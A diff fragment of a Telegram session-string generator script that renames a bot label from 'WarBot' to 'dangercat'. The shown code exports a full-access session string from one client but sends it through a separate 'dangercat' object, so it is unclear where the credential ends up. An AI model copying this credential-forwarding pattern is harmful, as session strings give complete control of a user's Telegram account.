@@ -24,7 +24,7 @@ if okvai == "69":
         APP_ID = int(input("\nEnter APP ID here: "))
         API_HASH = input("\nEnter API HASH here: ")
         with Client(':memory:', api_id=APP_ID, api_hash=API_HASH) as warbot:
-            print("\nYour WarBot Session Is sent in your Telegram Saved Messages.")
+            print("\nYour dangercat Session Is sent in your Telegram Saved Messages.")
             dangercat.send_message("me", f"#dangercat_MUSIC #WARBOT_SESSION\n\n`{warbot.export_session_string()}`")
     else:
         print("Please Enter 1 or 2 only.")
